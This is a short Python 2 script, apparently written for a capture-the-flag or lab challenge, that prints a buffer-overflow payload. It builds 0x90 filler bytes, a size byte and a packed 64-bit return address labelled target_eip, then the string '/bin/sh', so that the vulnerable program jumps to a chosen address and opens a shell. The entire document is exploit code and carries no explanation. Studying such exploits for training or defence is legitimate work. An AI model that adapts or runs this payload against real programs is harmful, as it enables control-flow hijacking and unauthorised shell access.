import struct


size_needed = "\xd0"

first_filler = "\x90" * 0x28

second_filler = "\x90" * 200

target_eip = struct.pack('Q', 0x55555555488c)

print first_filler + size_needed
print second_filler + target_eip
print "/bin/sh"
